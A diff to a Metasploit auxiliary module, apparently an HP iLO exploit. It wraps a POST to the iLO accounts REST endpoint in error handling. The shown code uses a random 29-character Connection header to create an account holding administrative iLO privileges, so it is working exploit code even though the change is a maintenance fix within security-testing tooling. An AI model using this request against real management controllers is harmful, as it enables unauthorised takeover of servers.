@@ -76,15 +76,18 @@ class MetasploitModule < Msf::Auxiliary
     data["Oem"]["Hp"]["Privileges"]["VirtualPowerAndResetPriv"] = true
     data["Oem"]["Hp"]["Privileges"]["iLOConfigPriv"] = true
 
-    res = send_request_cgi({
-                             'method' => 'POST',
-                             'uri'    => '/rest/v1/AccountService/Accounts',
-                             'ctype'  => 'application/json',
-                             'headers' => {
-                               "Connection" => Rex::Text.rand_text_alphanumeric(29)
-                             },
-                             'data' => data.to_json()
-                           })
+    begin
+      res = send_request_cgi({
+                               'method' => 'POST',
+                               'uri'    => '/rest/v1/AccountService/Accounts',
+                               'ctype'  => 'application/json',
+                               'headers' => {
+                                 "Connection" => Rex::Text.rand_text_alphanumeric(29)
+                               },
+                               'data' => data.to_json()
+                             })
+    rescue Rex::ConnectionRefused
+    end
 
     unless res
       fail_with(Failure::Unknown, 'Connection failed')
